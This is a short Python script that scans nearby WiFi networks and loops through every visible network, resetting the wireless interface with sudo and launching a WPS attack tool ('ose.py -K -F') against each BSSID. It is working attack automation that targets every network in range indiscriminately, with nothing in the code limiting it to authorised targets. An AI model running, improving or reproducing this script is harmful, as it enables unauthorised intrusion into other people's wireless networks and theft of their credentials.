#!venv/bin/python

import nmcli
import os
import subprocess
import time


INTERFACE = os.getenv("INTERFACE")
TIMEOUT = 30

def scan(interface: str, rescan: bool=True):
    print("Scanning...")
    while nmcli.device.wifi(ifname=interface) == []:
        nmcli.device.wifi_rescan(ifname=interface)
    print("Scan complete\n")
    return nmcli.device.wifi(ifname=interface)


def main_loop():
    while True:
        print("The outputs will be saved in the start script directory (ultimatetrollium/wifi/reports)")
        time.sleep(3)

        networks_old = scan(INTERFACE, True)
        networks_new = networks_old # eliminates an error on the first loop
        last_scan = time.time()

        print("Networks found:\n")
        for network in networks_old:
            print("--------")
            if network.ssid != "":
                print(f"{network.ssid}")
            else:
                print("(no name)")
            print(f"{network.bssid}\n")

        for network in networks_old:
            if network.ssid != "":
                ssid = network.ssid
            else:
                ssid = "(no name)"

            print(f"Target: {ssid}, {network.bssid}\n")

            if abs(time.time() - last_scan) > 10:
                networks_new = scan(INTERFACE, True)
                last_scan = time.time()

            if ssid == "(no name)":
                print("Hidden network, skipping...\n")
                continue

            # check if the network is still there
            network_present = False
            for n in networks_new:
                if network.bssid == n.bssid:
                    network_present = True
                    break

            if network_present == False:
                print("Network not found, skipping...\n")
                continue
            else:
                print("Network present\n")
            
            # The interface should always restart before running the attack
            subprocess.run(f"sudo ifconfig {INTERFACE} down", shell=True)
            subprocess.run(f"sudo iwconfig {INTERFACE} mode managed", shell=True)
            subprocess.run(f"sudo ifconfig {INTERFACE} up", shell=True)

            subprocess.run(f"timeout {TIMEOUT} sudo ../.scripts/ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)


if __name__ == "__main__":
    main_loop()
